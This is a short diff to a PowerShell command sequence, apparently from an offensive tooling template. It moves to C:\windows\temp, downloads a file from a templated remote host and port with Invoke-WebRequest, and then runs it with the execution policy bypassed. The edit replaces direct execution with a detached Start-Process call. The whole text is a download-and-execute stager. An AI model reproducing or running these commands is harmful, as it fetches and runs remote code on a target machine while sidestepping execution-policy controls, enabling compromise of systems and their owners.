@@ -1,2 +1,3 @@
+cd C:\windows\temp;
 iwr -Uri "http://${http_ip}:${http_port}/${filename}" -OutFile "${filename}";
-powershell -ep bypass ./${filename};
+Start-Process -FilePath "powershell" -ArgumentList "-ep bypass ./${filename}";
